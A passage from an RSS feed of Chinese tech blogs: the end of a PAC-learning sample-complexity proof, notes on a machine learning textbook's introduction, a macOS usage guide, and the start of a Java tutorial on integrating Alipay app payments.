L_{(\mathcal{D},f)}(h_S) &gt; \epsilon\rbrace) \le \mathcal{D}^m(M) = \mathcal{D}^m({\cup}_{h\in \mathcal{H}_B} \lbrace S|_x : L_S(h) = 0\rbrace) \tag{2.6}\]</span></p><p>利用 <code>Union Bound</code> 定理，可得：</p><p><span class="math display">\[\mathcal{D}^m(\lbrace S|_x : L_{(\mathcal{D},f)}(h_S) &gt; \epsilon\rbrace) \le \underset{h\in \mathcal{H}_B}{\sum}\mathcal{D}^m(\lbrace S|_x : L_S(h) = 0\rbrace)\tag{2.7}\]</span></p><div class="note info"><p><strong>定理（Union Bound）</strong></p><ul><li>对于两个集合 <span class="math inline">\(A\)</span>，<span class="math inline">\(B\)</span> 和分布 <span class="math inline">\(\mathcal{D}\)</span> ，有 <span class="math display">\[\mathcal{D}(A\cup B) \le \mathcal{D}(A) + \mathcal{D}(B)\]</span></li></ul></div><p>由于事件 <span class="math inline">\(L_S(h) = 0\)</span> 等价于 <span class="math inline">\(\forall i, h(x_i) = f(x_i)\)</span> ，所以，</p><p><span class="math display">\[\mathcal{D}^m(\lbrace S|_x : L_S(h) = 0\rbrace) = \mathcal{D}^m(\lbrace S|_x : \forall i, h(x_i) = f(x_i) \rbrace)\]</span></p><p>又因为采样训练样本相互独立，且服从同一个分布 <span class="math inline">\(\mathcal{D}\)</span> ，因此，</p><p><span class="math display">\[\mathcal{D}^m(\lbrace S|_x : \forall i, h(x_i) = f(x_i) \rbrace) = \prod_{i=1}^{m}\mathcal{D}(\lbrace x_i : h(x_i) = f(x_i) \rbrace)\]</span></p><p>故有</p><p><span class="math display">\[\mathcal{D}^m(\lbrace S|_x : L_S(h) = 0\rbrace) = \prod_{i=1}^{m}\mathcal{D}(\lbrace x_i : h(x_i) = f(x_i) \rbrace) \tag{2.8}\]</span></p><p>对于训练集中每一个独立的元素，有</p><p><span class="math display">\[{D}(\lbrace x_i : h(x_i) = y_i \rbrace) = 1 - L_{(\mathcal{D},f)}\]</span></p><p>由于 <span class="math inline">\(L_{(\mathcal{D},f)}(h_s)&gt;\epsilon\)</span> ，故</p><p><span class="math display">\[{D}(\lbrace x_i : h(x_i) = y_i \rbrace) = 1 - L_{(\mathcal{D},f)} \le 1 - \epsilon\]</span></p><p>利用 <span class="math inline">\(1-\epsilon \le e^{-\epsilon}\)</span> 不等式对上式放缩，有</p><p><span class="math display">\[{D}(\lbrace x_i : h(x_i) = y_i \rbrace) = 1 - L_{(\mathcal{D},f)} \le 1 - \epsilon \le e^{- \epsilon}\]</span></p><p>将上式带入式（2.8），有</p><p><span class="math display">\[\mathcal{D}^m(\lbrace S|_x : L_S(h) = 0\rbrace)\le (1 - \epsilon)^m \le e^{- m\epsilon} \tag{2.9}\]</span></p><p>结合式（2.7），有</p><p><span class="math display">\[\mathcal{D}^m(\lbrace S|_x : L_{(\mathcal{D},f)}(h_S) &gt; \epsilon\rbrace) \le |\mathcal{H}_B|e^{- m\epsilon} \le |\mathcal{H}|e^{- m\epsilon}\]</span></p><p>设 <span class="math inline">\(\mathcal{D}^m(\lbrace S|_x : L_{(\mathcal{D},f)}(h_S) &gt; \epsilon\rbrace) \le |\mathcal{H}|e^{- m\epsilon}&lt; \delta\)</span> ，则有</p><p><span class="math display">\[m &gt; \frac{log(\frac{|\mathcal{H}|}{\delta})}{\epsilon}\]</span></p><div class="note info"><p><strong>推导过程</strong></p><p><span class="math display">\[\delta &gt; |\mathcal{H}|e^{-m\epsilon}\]</span></p><p><span class="math display">\[log\delta &gt; log|\mathcal{H}|-m\epsilon\]</span></p><p><span class="math display">\[m\epsilon &gt; log|\mathcal{H}| - log\delta\]</span></p><p><span class="math display">\[m&gt; \frac{log(\frac{|\mathcal{H}|}{\delta})}{\epsilon}\]</span></p></div><p>综上所述，有如下重要结论：</p><div class="note info"><p>设 <span class="math inline">\(\mathcal{H}\)</span> 为一个有限的假设类，令 <span class="math inline">\(\delta \in (0,1)\)</span> ，<span class="math inline">\(\epsilon &gt; 0\)</span> ，<span class="math inline">\(m\)</span> 为一个满足以下条件的整数： <span class="math display">\[m&gt; \frac{log(\frac{|\mathcal{H}|}{\delta})}{\epsilon}\]</span> 那么，对于任意的标记函数 <span class="math inline">\(f\)</span> ，任意的分布 <span class="math inline">\(\mathcal{D}\)</span> ，如果满足可实现假设（即，存在 <span class="math inline">\(h\in \mathcal{H}\)</span> ，使得 <span class="math inline">\(L_{(\mathcal{D},f)}(h) = 0\)</span>），则至少有 <span class="math inline">\(1-\delta\)</span> 的可能性，在 <span class="math inline">\(S\)</span> 上独立采样 <span class="math inline">\(m\)</span> 个点，对于每一个 <span class="math inline">\(ERM\)</span> 假设，满足如下式子： <span class="math display">\[L_{(\mathcal{D},f)}(h_S) \le \epsilon\]</span></p></div><p>这个结论意味着，只要有足够的训练数据（<span class="math inline">\(m&gt; \frac{log(\frac{|\mathcal{H}|}{\delta})}{\epsilon}\)</span>），在有限假设类上的 <span class="math inline">\(ERM_{\mathcal{H}}\)</span> 会尽可能近似正确（其置信参数为 <span class="math inline">\(1-\delta\)</span> ，最大的误差为 <span class="math inline">\(\epsilon\)</span>）。</p><h1 id="reference">Reference</h1><p>Shai Shalev-Shwartz, Shai Ben-David. <a href="https://www.cs.huji.ac.il/~shais/UnderstandingMachineLearning/index.html" target="_blank" rel="noopener">Understanding Machine Learning: From Theory to Algorithms</a></p>]]></content>
        <author>
            <name><![CDATA[CosmosNing的个人博客]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://cosmosning.github.io/2020/09/13/intro-to-ml/</id>
        <title><![CDATA[《从理论到算法理解机器学习》引言]]></title>
        <updated>2020-12-13T06:40:34+08:00</updated>
        <link href="https://cosmosning.github.io/2020/09/13/intro-to-ml/"/>
        <content type="text/html" src="https://cosmosning.github.io/2020/09/13/intro-to-ml/"><![CDATA[<blockquote><p>最近上了一门课，叫做“智能信息检索”。老师推荐了一本教材 《Understanding Machine Learning: From Theory to Algorithms》（文末提供官方下载链接），来解释<strong>智能</strong>的含义。本文基于我对教材的理解，对其引言部分做了一些要点概括，供读者参考。</p></blockquote><h1 id="what-is-learning">What Is Learning？</h1><p>粗略地讲，<strong>学习是一个将经历（<em>experience</em>）转换为技能（<em>expertise</em>）或知识（<em>knowledge</em>）的过程</strong>。一般地，一个学习算法的<strong>输入</strong>是<strong>训练数据</strong>（代表经历），<strong>输出</strong>是<strong>技能</strong>。</p><p>一种常见的学习方法是 “记忆学习”（<em>learning by memorization</em>）。类似人类学习的“死记硬背”，这种学习方法有时候十分有效，但是它却缺失了学习系统中一个十分重要的能力，即<strong>泛化能力</strong>（<em>generalization</em>）。换句话讲，一个成功的学习系统理应能够依据已知知识，正确处理未知的情况。</p><div class="note info"><p><strong>泛化能力</strong> （<em>generalization</em>） 有时也被称作<strong>归纳推理</strong> （<em>inductive reasoning / inductive inference</em>）</p></div><p>然而，<strong>归纳推理可能会导致错误结论</strong>。那么怎样才能减少犯错呢？</p><p>答案是：在学习系统中<strong>引入先验知识</strong>（<em>prior knowledge</em>）！</p><div class="note info"><p><strong>先验知识</strong>（<em>prior knowledge</em>） 有时也被称作<strong>归纳偏好</strong> （<em>inductive bias</em>）</p></div><p>从书中举得几个例子来看，<strong>引入先验知识，使整个学习过程带有偏好，是一个成功的学习算法必然发生的事情</strong>（这种现象是 <strong>No-Free-Lunch Theorem</strong> 的具体表现）。粗略来说，学习算法开始训练时所引入的先验知识越强，从训练样本中学习就越简单。但是，先验知识越强，学习的灵活性也就越低，因为整个学习过程被这些预定假设束缚住了。</p><h1 id="when-we-need-machine-learning">When We Need Machine Learning？</h1><p>那么，在哪些情况下，我们需要利用机器学习解决问题呢？主要有以下两个方面：</p><ul><li>问题的复杂性（<em>complexity</em>）</li><li>任务的适应性需求（<em>adaptivity</em>）</li></ul><h2 id="tasks-that-are-to-complex-to-program">Tasks That Are to Complex to Program</h2><ul><li><em>Tasks Performed by Animals / Humans</em>：我们暂时无法理解一些我们能够处理的日常任务，例如驾驶汽车、语音识别、图像理解。以现有的知识，难以抽象出一个良好的程序去执行这些任务。然而，先进的机器学习程序，只要接受足够的训练样本训练，就可以从中学习经验，并在这些任务中达到不错的效果。</li><li><em>Tasks beyond Human Capabilities</em>：另一类适合用机器学习解决的问题是对巨大的且复杂的数据（例如宇宙空间数据、医疗数据、天气数据等）进行分析。这些数据的处理和分析通常超越了我们自身的分析能力。使用机器学习，可以充分利用计算机的能力，找到数据中有价值的信息。</li></ul><h2 id="adaptivity">Adaptivity</h2><ul><li>预先编程的程序有一个缺陷，即死板性（<em>rigidity</em>）。也就是说，一旦程序写好了，安装到系统中后，程序就不会变化了。然而，现实中许多任务都是在不断变化的。</li><li>而机器学习（其天生可以适应不同的输入数据）提供了一种解决此类任务的方案。</li></ul><h1 id="types-of-learning">Types of Learning</h1><h2 id="supervised-versus-unsupervised">Supervised versus Unsupervised</h2><p>如果将学习看作是一个“利用经历来获取技能”的过程，那么监督学习和非监督学习可以描述如下：</p><ul><li><strong>监督（<em>Supervised</em>）学习</strong>：在该场景中，“经历”（亦可称作训练样本）包含了十分重要的信息；而这些信息却在测试样本中丢失了。从监督学习中学习到的技能的目标是，预测测试数据中的确实信息。这就好像环境作为一名老师通过提供额外的信息（通常称作<strong>“标签”</strong> <em>label</em>）"监督"学生（学习算法）的学习。</li><li><strong>非监督（<em>Unsupervised</em>）学习</strong>：对于非监督学习来说，训练数据和测试数据几乎没什么区别。通常，这种学习方法通过处理输入数据，来达到<strong>总结数据</strong>、<strong>压缩数据</strong>的目标。<strong>聚类</strong>——将一个数据集分成几个子集，同一子集具有相似性——是非监督学习中一个典型的例子。</li><li>在监督与非监督之间，还存在一种不同的方法——<strong>强化学习</strong>。</li></ul><h2 id="active-versus-passive">Active versus Passive</h2><ul><li><strong>主动（<em>Active</em>）学习</strong>：主动学习在在训练过程中将会与环境交互。</li><li><strong>被动（<em>Passive</em>）学习</strong>：被动学习只会观测环境所提供的信息，而不会影响（influence）或指导（direct）它。</li></ul><div class="note info"><p><strong>例子</strong></p><ul><li>垃圾邮件识别通常是被动学习，因为它等着用户为它标记收到的邮件是否是垃圾邮件。</li><li>在主动学习的场景下，学习算法会在训练过程中要求用户标记它指定的邮件，或者甚至是由学习算法生成的邮件，来增强它对什么是垃圾邮件的理解。</li></ul></div><h2 id="helpful-of-the-teacher">Helpful of the Teacher</h2><ul><li>主动提供信息<ul><li>训练信息<strong>正相关</strong>——普通学习：例如，教师会不断尝试为学生提供最有用的信息，来达到某种学习目标。</li><li>训练信息<strong>负相关</strong>——<strong>对抗（<em>Adversarial</em>）学习</strong>：例如垃圾邮件生成器将会努力误导垃圾邮件识别器。</li></ul></li><li>被动提供信息<ul><li><strong>统计学习（<em>Statistical Learning</em>）</strong>：有时候，信息并不是他人主动提供的。例如科学家在认识自然时，环境，作为一位老师，并不会根据学生的需求主动的提供信息，因此是被动的提供信息。这种情况下，输入数据常常被认为是由某种随机过程（<em>random process</em>）产生。这样，就可以使用统计学习解决问题</li></ul></li></ul><h2 id="online-versus-batch-learning-protocol">Online versus Batch Learning Protocol</h2><ul><li><strong>在线学习（<em>Online Learning</em>）</strong>：学习算法必须在训练过程中，在线反馈。例如，股票交易员需要基于目前位置积累的经验，做出每日决策。虽说随着时间推移，他会称为一名专家，但是也可能在此过程中犯下代价高昂的错误。</li><li><strong>批处理学习（<em>Batch Learning</em>）</strong>：只有在处理大量的数据后，该算法才能获得所需的技能。在数据挖掘场景下，数据挖掘算法会处理大量的数据之后，才会得出相关的结论。</li></ul><h1 id="relations-to-other-fields">Relations to Other Fields</h1><h2 id="with-ai">With AI</h2><ul><li>机器学习是 AI 的一个分支。</li><li>机器学习更关注<strong>利用计算机的优势和独特的能力</strong>来<strong>补充</strong>人类的智能，因此常常处理一些远超人类能力的任务。</li><li>AI 更关注创造一个能够自动<strong>模仿</strong>智能行为的机器。</li></ul><h2 id="with-statistics">With Statistics</h2><ul><li>统计学：提出假设（专业人员） <span class="math inline">\(\rightarrow\)</span> <strong>验证假设</strong>（统计学）</li><li>机器学习：利用数据，<strong>挖掘规律</strong>，解释原因。</li><li>机器学习对<strong>算法</strong>层面的考虑更多</li><li>统计学常常关注数据的<strong>渐进性</strong>（<strong>无穷</strong>情况下的特性），机器学习则关注<strong>有限</strong>的样本空间</li><li>统计学通常<strong>预先假设数据分布</strong>，而机器学习是<strong>分布无关</strong>的（<em>distribution-free</em>）</li></ul><h1 id="reference">Reference</h1><p>Shai Shalev-Shwartz, Shai Ben-David. <a href="https://www.cs.huji.ac.il/~shais/UnderstandingMachineLearning/index.html" target="_blank" rel="noopener">Understanding Machine Learning: From Theory to Algorithms</a></p>]]></content>
        <author>
            <name><![CDATA[CosmosNing的个人博客]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.triplez.cn/macos-user-guide/</id>
        <title><![CDATA[macOS 使用笔记]]></title>
        <updated>2020-10-20T13:34:15+08:00</updated>
        <link href="https://blog.triplez.cn/macos-user-guide/"/>
        <content type="text/html" src="https://blog.triplez.cn/macos-user-guide/"><![CDATA[<h2><span class="ez-toc-section" id="TL_DR">TL; DR</span></h2>
<p>如果觉得这篇文章太长了，遇到问题直接在 <a href="https://support.apple.com/zh-cn/guide/mac-help/welcome/mac">这里</a> 搜索吧～</p>
<h2><span class="ez-toc-section" id="i">外设使用</span></h2>
<h3><span class="ez-toc-section" id="i-2">鼠标翻转</span></h3>
<p><a href="https://github.com/pilotmoon/Scroll-Reverser">Scroll-Reverser</a></p>
<h3><span class="ez-toc-section" id="4K_HiDPI">4K 及以下分辨率屏幕开启 HiDPI</span></h3>
<p>笔者之前买的屏幕是 2K 分辨率的，如果不使用 Apple 的 HiDPI 技术，MacBook 会把这个屏幕当做是电视，投影效果非常的差，文字模糊的不行。使用以下项目的脚本可以在低分辨率屏幕上强制打开 HiDPI 功能，效果卓群，建议折腾一下。</p>
<p><a href="https://github.com/xzhih/one-key-hidpi/blob/master/README-zh.md">xzhih/one-key-hidpi</a></p>
<blockquote><p>
  笔者注：运行脚本需要关闭 SIP，步骤可见 <a href="#打开/关闭-macOS-SIP（系统完整性保护）">打开/关闭 macOS SIP（系统完整性保护）</a> 。
</p></blockquote>
<h3><span class="ez-toc-section" id="Windows">Windows 键盘按键兼容</span></h3>
<p>可在系统设置的 <code>键盘 &gt; 修饰键</code> 中将 Command 和 Option 键调换。</p>
<p><img src="https://triplez-public-1251926021.cos.ap-shanghai.myqcloud.com/picgoimage-20200920172108802.png" alt="image-20200920172108802" /></p>
<h2><span class="ez-toc-section" id="i-3">系统相关</span></h2>
<h3><span class="ez-toc-section" id="i-4">无法打开来自身分不明开发者的应用</span></h3>
<p><img src="https://triplez-public-1251926021.cos.ap-shanghai.myqcloud.com/picgomacos-mojave-unidentified-developer-alert-open-dark.jpg" alt="img" /></p>
<p>按住 <kbd>Control ⌃</kbd> 键并点击应用，在菜单中选择“打开”，弹出的对话框周就会如上有“打开”选项了。</p>
<h3><span class="ez-toc-section" id="_macOS_SIP">打开/关闭 macOS SIP（系统完整性保护）</span></h3>
<p>重启后按住 <kbd>Command ⌘</kbd> + <kbd>R</kbd> ，直到看到 Apple 标志再松开。在菜单栏中选择“实用工具”，打开“终端”。</p>
<p>打开 SIP：</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">csrutil enable
</code></pre>
<p>关闭 SIP：</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">csrutil disable
</code></pre>
<p>需要重启生效。</p>
<h2><span class="ez-toc-section" id="i-5">常用快捷键</span></h2>
<table>
<thead>
<tr>
<th>功能</th>
<th>快捷键</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>截图</td>
<td><kbd>Command ⌘</kbd> + <kbd>Shift ⇧</kbd> + <kbd>4</kbd></td>
<td>进入截图后长按 <kbd>Space</kbd> 可以<del>优雅地</del>截取某个指定窗口</td>
</tr>
<tr>
<td>截图并复制到剪切板</td>
<td><kbd>Control ⌃</kbd> + <kbd>Command ⌘</kbd> + <kbd>Shift ⇧</kbd> + <kbd>4</kbd></td>
<td>进入截图后长按 <kbd>Space</kbd> 可以<del>优雅地</del>截取某个指定窗口</td>
</tr>
<tr>
<td>Spotlight “聚焦”搜索</td>
<td><kbd>Command ⌘</kbd> + <kbd>Space</kbd></td>
<td></td>
</tr>
<tr>
<td>切换输入法</td>
<td><kbd>Caps Lock ⇪</kbd></td>
<td>短按为切换输入法，长按为切换大小写</td>
</tr>
<tr>
<td>切换任务</td>
<td><kbd>Command ⌘</kbd> + <kbd>Tab</kbd></td>
<td></td>
</tr>
<tr>
<td>切换桌面</td>
<td><kbd>Control ⌃</kbd> + <kbd>左/右箭头</kbd></td>
<td></td>
</tr>
<tr>
<td>调度中心</td>
<td><kbd>Control ⌃</kbd> + <kbd>上箭头</kbd></td>
<td></td>
</tr>
</tbody>
</table>
<p>更多快捷键请看 Apple 支持网站中的 <a href="https://support.apple.com/zh-cn/HT201236">Mac 键盘快捷键</a>。</p>
<h2><span class="ez-toc-section" id="OneNote">OneNote</span></h2>
<p>从 <a href="https://apps.apple.com/cn/app/microsoft-onenote/id784801555?mt=12">AppStore 下载</a> 即可，或者直接点击下方的链接。</p>
<p><a href="itms-apps://apps.apple.com/cn/app/microsoft-onenote/id784801555?mt=12">Click here to direct download OneNote from AppStore for macOS</a></p>
<h2><span class="ez-toc-section" id="Clipboard">Clipboard</span></h2>
<p>剪切板管理应用：<a href="https://github.com/p0deje/Maccy/releases">Maccy</a> 。</p>
<blockquote><p>
  从 GitHub Release 中下载最新 zip 包解压即可。</p>
<p>  安装方式：将 <code>maccy.app</code> 拖入 Application 文件夹中。
</p></blockquote>
<h2><span class="ez-toc-section" id="Terminal">Terminal</span></h2>
<h3><span class="ez-toc-section" id="iTerm2">iTerm2</span></h3>
<h3><span class="ez-toc-section" id="proxychains-ng">proxychains-ng</span></h3>
<p>For proxy in Command ⌘ line.</p>
<h3><span class="ez-toc-section" id="oh-my-zsh">oh-my-zsh</span></h3>
<p>Great terminal theme and other fancy functions.</p>
<h3><span class="ez-toc-section" id="zsh_plugins">zsh plugins</span></h3>
<p>More in <a href="https://github.com/unixorn/awesome-zsh-plugins#plugins">here</a>.</p>
<h4><span class="ez-toc-section" id="autosuggestion">autosuggestion</span></h4>
<p><a href="https://github.com/zsh-users/zsh-autosuggestions">zsh-users/zsh-autosuggestions</a></p>
<h4><span class="ez-toc-section" id="syntax-highlighting">syntax-highlighting</span></h4>
<p><a href="https://github.com/zsh-users/zsh-syntax-highlighting">zsh-users/zsh-syntax-highlighting</a></p>
<h3><span class="ez-toc-section" id="vimrc">vimrc</span></h3>
<p>The most comfortable configuration for vim.</p>
<p><a href="https://github.com/amix/vimrc">amix/vimrc</a></p>
<h2><span class="ez-toc-section" id="Markdown">Markdown</span></h2>
<h3><span class="ez-toc-section" id="Typora">Typora</span></h3>
<p><a href="https://typora.io/">Typora -- a markdown editor, markdown reader</a></p>
<h3><span class="ez-toc-section" id="PicGo">PicGo</span></h3>
<p><a href="https://github.com/Molunerfinn/PicGo">PicGo - 图片上传新体验</a></p>
<p>在 Typora 中设置 PicGo 上传图片：https://support.typora.io/Upload-Image/#picgoapp-chinese-language-only</p>
<p>The post <a rel="nofollow" href="https://blog.triplez.cn/macos-user-guide/">macOS 使用笔记</a> appeared first on <a rel="nofollow" href="https://blog.triplez.cn">Blog</a>.</p>]]></content>
        <author>
            <name><![CDATA[TripleZ’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://www.windboy.top/2020/10/16/blog11/</id>
        <title><![CDATA[Java 实现支付宝后台支付接口]]></title>
        <updated>2020-10-16T08:09:55+08:00</updated>
        <link href="http://www.windboy.top/2020/10/16/blog11/"/>
        <content type="text/html" src="http://www.windboy.top/2020/10/16/blog11/"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>项目中需要对商品订单进行支付，这里记录下自己是如何使用 Java 实现支付宝后台支付接口，支付操作为 App 支付。</p><p>官方文档：<a href="https://opendocs.alipay.com/open/204/105297" target="_blank" rel="noopener">https://opendocs.alipay.com/open/204/105297</a> 。</p><h2 id="编码前的准备"><a href="#编码前的准备" class="headerlink" title="编码前的准备"></a>编码前的准备</h2><p>1.<strong>创建应用</strong></p><p>在支付宝开放平台的开发者中心，创建自己的应用，并取得应用的唯一标识 APPID。</p><p>2.<strong>添加支付能力</strong></p><p>在应用详情页面，添加能力-App 支付，并进行签约。</p><p>3.<strong>密钥生成和配置</strong></p><p>为了保障交易身份与数据的安全，需要进行密钥的配置，这里由于是企业的项目，需要配置公钥证书，这里需要用到支付宝开放平台开发助手，生成 CSR 文件：应用公钥、私钥、证书这 3 个文件。详见官网文档：<a href="https://opendocs.alipay.com/open/291/105971" target="_blank" rel="noopener">https://opendocs.alipay.com/open/291/105971</a> 。</p><p>然后需要在应用的开发信息中，设置接口加签方式，上传 CSR 文件，在线生成应用公钥证书即 .crt 文件，然后上传这个证书。上传完成后，还可以下载对应的支付宝公钥证书和支付宝根证书。</p><p>4.<strong>后台集成支付宝的 SDK</strong></p><p>这个 SDK 用于协助解析并验证客户端同步返回的支付结果和异步通知。</p><p>App 端也需要集成支付宝对应的 SDK。</p><h2 id="编写支付接口"><a href="#编写支付接口" class="headerlink" title="编写支付接口"></a>编写支付接口</h2><h3 id="支付宝支付流程图"><a href="#支付宝支付流程图" class="headerlink" title="支付宝支付流程图"></a>支付宝支付流程图</h3><img src="/images/blog11/alipay.png" width="80%"/><h3 id="在-App-端的表现"><a href="#在-App-端的表现" class="headerlink" title="在 App 端的表现"></a>在 App 端的表现</h3><p>用户在 App 上点击立即购买，选择支付方式，点击确定支付调用后台接口并跳转到支付宝 App，付款完成后，跳转回 App，完成支付。</p><h3 id="后台接口的需求"><a href="#后台接口的需求" class="headerlink" title="后台接口的需求"></a>后台接口的需求</h3><p>后台需要提供 3 个接口：订单信息加密、支付宝服务端异步通知、最终付款校验。</p><h3 id="接口-1：订单信息加密"><a href="#接口-1：订单信息加密" class="headerlink" title="接口 1：订单信息加密"></a><strong>接口 1：订单信息加密</strong></h3><p><strong>功能</strong></p><p>传入订单信息，返回加密后的订单字符串，并在项目数据库保存支付宝订单信息。</p><p><strong>密钥验证方式</strong></p><p>支付宝客户端将传送的消息用私钥加密，服务端使用公钥对消息进行验证。</p><p><strong>代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping</span>(value = <span class="string">"/encrypt"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> AjaxResult <span class="title">getAliPayOrder</span><span class="params">(@RequestParam String orderSn)</span> <span class="keyword">throws</span> AlipayApiException </span>&#123;</span><br><span class="line">  </span><br><span class="line">    EOrder eOrder=eOrderService.selectEOrderByOrderSn(orderSn);</span><br><span class="line"></span><br><span class="line">    AlipaymentOrder alipaymentOrder = <span class="keyword">new</span> AlipaymentOrder();</span><br><span class="line">    alipaymentOrder.setOrderId(eOrder.getOrderId().intValue());</span><br><span class="line">    alipaymentOrder.setOutTradeNo(orderSn);</span><br><span class="line">    alipaymentOrder.setAmount(eOrder.getActualPrice());</span><br><span class="line">    <span class="comment">// 订单生成，等待用户付款</span></span><br><span class="line">    alipaymentOrder.setTradeStatus(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//构造client</span></span><br><span class="line">    CertAlipayRequest certAlipayRequest = <span class="keyword">new</span> CertAlipayRequest();</span><br><span class="line">    <span class="comment">//设置网关地址</span></span><br><span class="line">    certAlipayRequest.setServerUrl(<span class="string">"https://openapi.alipay.com/gateway.do"</span>);</span><br><span class="line">    <span class="comment">//设置应用Id</span></span><br><span class="line">    certAlipayRequest.setAppId(app_id);</span><br><span class="line">    <span class="comment">//设置应用私钥</span></span><br><span class="line">    certAlipayRequest.setPrivateKey(privateKey);</span><br><span class="line">    <span class="comment">//设置请求格式，固定值json</span></span><br><span class="line">    certAlipayRequest.setFormat(<span class="string">"json"</span>);</span><br><span class="line">    <span class="comment">//设置字符集</span></span><br><span class="line">    certAlipayRequest.setCharset(<span class="string">"UTF-8"</span>);</span><br><span class="line">    <span class="comment">//设置签名类型</span></span><br><span class="line">    certAlipayRequest.setSignType(<span class="string">"RSA2"</span>);</span><br><span class="line">    <span class="comment">//设置应用公钥证书路径</span></span><br><span class="line">    certAlipayRequest.setCertPath(certPath);</span><br><span class="line">    <span class="comment">//设置支付宝公钥证书路径</span></span><br><span class="line">    certAlipayRequest.setAlipayPublicCertPath(alipayPublicCertPath);</span><br><span class="line">    <span class="comment">//设置支付宝根证书路径</span></span><br><span class="line">    certAlipayRequest.setRootCertPath(rootCertPath);</span><br><span class="line">    <span class="comment">//构造client</span></span><br><span class="line">    AlipayClient alipayClient = <span class="keyword">new</span> DefaultAlipayClient(certAlipayRequest);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//实例化具体API对应的request类,类名称和接口名称对应,当前调用接口名称：alipay.trade.app.pay</span></span><br><span class="line">    AlipayTradeAppPayRequest request = <span class="keyword">new</span> AlipayTradeAppPayRequest();</span><br><span class="line">    <span class="comment">//SDK已经封装掉了公共参数，这里只需要传入业务参数。以下方法为sdk的model入参方式(model和biz_content同时存在的情况下取biz_content)。</span></span><br><span class="line">    AlipayTradeAppPayModel model = <span class="keyword">new</span> AlipayTradeAppPayModel();</span><br><span class="line">    model.setBody(<span class="string">"xx"</span>);</span><br><span class="line">    model.setSubject(<span class="string">"xx"</span>);</span><br><span class="line">    model.setOutTradeNo(orderSn);</span><br><span class="line">    model.setTimeoutExpress(<span class="string">"30m"</span>);</span><br><span class="line">    model.setTotalAmount(eOrder.getActualPrice().toString());</span><br><span class="line">    model.setProductCode(<span class="string">"QUICK_MSECURITY_PAY"</span>);</span><br><span class="line">    request.setBizModel(model);</span><br><span class="line">    <span class="comment">// 需要外网需要能直接访问的地址</span></span><br><span class="line">    request.setNotifyUrl(<span class="string">"xxx"</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//这里和普通的接口调用不同，使用的是sdkExecute</span></span><br><span class="line">        AlipayTradeAppPayResponse response = alipayClient.sdkExecute(request);</span><br><span class="line">        <span class="comment">// 如果未发生异常，则记录支付宝订单</span></span><br><span class="line">        alipaymentOrderService.insertAlipaymentOrder(alipaymentOrder);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> AjaxResult.success(response.getBody());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (AlipayApiException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> AjaxResult.error(<span class="string">"加密失败！"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>入参 orderSn 是订单编号，这里需要在项目后台数据库保存支付宝支付订单，使用 AlipaymentOrder 这个实体类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AlipaymentOrder</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 订单ID</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> orderId;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 订单号</span></span><br><span class="line">    <span class="keyword">private</span> String outTradeNo;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 金额</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">double</span> amount;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 交易状态</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> tradeStatus;</span><br><span class="line"></span><br><span class="line">    <span 